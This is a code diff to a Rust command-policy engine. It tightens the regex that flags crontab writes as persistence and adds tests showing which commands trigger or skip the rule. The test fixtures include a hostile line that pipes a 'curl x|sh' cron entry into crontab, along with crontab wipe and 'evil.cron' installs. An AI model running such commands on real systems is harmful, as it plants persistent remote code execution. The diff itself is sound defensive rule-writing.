@@ -255,8 +255,13 @@ pub fn builtin_rules() -> &'static [PolicyRule] {
                     cfg = r"\.git/hooks/"
                 ),
                 "Writing a git hook or redirecting core.hooksPath (persistence)"),
+            // Command-position anchored: `man crontab` / `which crontab` /
+            // `grep crontab …` must not Ask. Accepted narrowing: exotic
+            // indirection (`xargs crontab`, `docker run … crontab`) no longer
+            // matches the raw line; nested `bash -c 'crontab …'` still fires
+            // via the unwrap views.
             ask("write_crontab",
-                r"(?i)(?:\bcrontab\s*(?:$|[;&|)])|\bcrontab\s+(?:-u\s+\S+\s+)?(?:-[er]\b|-(?:\s|$|[;&|)])|[^-\s]\S*))",
+                r"(?i)(?:^|[;&|(]|\$\(|`)\s*(?:\w+=\S*\s+)*(?:(?:sudo|doas|env)\s+(?:(?:-\S+|\w+=\S*)\s+)*)?crontab(?:\s*(?:$|[;&|)])|\s+(?:-u\s+\S+\s+)?(?:-[er]\b|-(?:\s|$|[;&|)])|[^-\s]\S*))",
                 "Installing or modifying a crontab (persistence)"),
             ask("write_launch_agents",
                 &format!(
@@ -823,12 +828,35 @@ mod tests {
             "echo '* * * * * curl x|sh' | crontab -",
             "crontab",
             "crontab -u deploy evil.cron",
+            "sudo crontab -r",
+            "cd /tmp && crontab evil.cron",
+            "FOO=bar crontab evil.cron",
+            "bash -c 'crontab evil.cron'",
         ] {
             let v = p.evaluate(cmd);
             assert_eq!(v.action, PolicyAction::Ask, "{cmd}");
             assert_eq!(v.rule_name, "write_crontab", "{cmd}");
         }
         for cmd in ["crontab -l", "crontab -u deploy -l"] {
+            assert_eq!(p.evaluate(cmd).action, PolicyAction::Allow, "{cmd}");
+        }
+    }
+
+    #[test]
+    fn crontab_mentions_in_non_command_position_do_not_fire() {
+        let p = Policy::compile(&PolicyConfig::default()).unwrap();
+        for cmd in [
+            "man crontab",
+            "man 5 crontab",
+            "which crontab",
+            "whatis crontab",
+            "apropos crontab",
+            "grep crontab README.md",
+            "grep -r crontab src/",
+            "cat crontab.txt",
+            "git commit -m \"add crontab support\"",
+            "echo \"crontab -r\"",
+        ] {
             assert_eq!(p.evaluate(cmd).action, PolicyAction::Allow, "{cmd}");
         }
     }
